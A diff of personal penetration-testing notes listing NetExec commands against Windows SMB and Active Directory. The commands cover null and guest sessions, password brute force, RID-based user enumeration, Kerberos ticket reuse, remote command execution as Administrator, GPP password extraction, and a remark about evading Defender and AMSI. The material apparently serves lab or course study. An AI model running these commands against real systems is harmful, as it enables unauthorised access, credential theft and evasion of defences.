@@ -1,7 +1,50 @@
 
-user enumeration using kerberos
-`nxc smb 10.10.106.240 -u users.txt -p '' --kerberos`
--k is the same thing
+nullsessions
+`nxc smb 10.10.10.10`
+`nxc smb 10.10.10.10 -u '' -p ''`
+
+`nxc smb 10.10.10.10 -u 'guest' -p ''`
+`nxc smb 10.10.10.10 -u 'guest' -p '' --shares`
+
+brute force password
+`nxc smb 10.10.10.10 -u 'sofia' -p 'password-file'`
+
+enum usernames
+`nxc smb 10.10.10.10 -u 'sofia' -p 'mypass1' --rid-brute`
+(rid is the end of the sid)
+
+The same but using Kerberos - Kerberos traffic is more common on the network (the default is NTLM)
+`nxc smb 10.10.10.10 -u 'sofia' -p 'mypass1'`
+`nxc smb 10.10.10.10 -u 'sofia' -p 'mypass1' -k`
+
+--use-kcache uses existing Kerberos ticket
+`nxc smb 10.10.10.10 -u 'sofia' -p 'mypass1' --use-kcache`
+get ticket by
+`impacket-getTGT -dc-ip 10.10.10.10 domain.LOCAL/usename`
+`export KRB5CCNAME= user.ccache`
+mostly useful for golden.. tickets
+`nxc smb 10.10.10.10 -u 'Administrator' -p 'securepass2'`
+
+Execute commands
+-x uses cmd
+-X uses ps
+`nxc smb 10.10.10.10 -u 'Administrator' -p 'securepass2' -x 'whoami'`
+`nxc smb 10.10.10.10 -u 'Administrator' -p 'securepass2' -X 'whoami'`
+
+.nxc/obfuscated_scripts
+can make your own since fingerprinted - defender finds
+custom amsi bypass on nxc webbpage
+
+or run ps with cmd lol
+`nxc smb 10.10.10.10 -u 'Administrator' -p 'securepass2' -x 'powershell.exe -c "GCI C:\"'`
+
+
+`nxc smb <ip> -u '' -p '' -M spider_plus`
+from kristiee
+
+fast user, priv, service enum
+`nxc smb <ip> -u '' -p '' -M gpp_password`
+
 
 
 ```sh
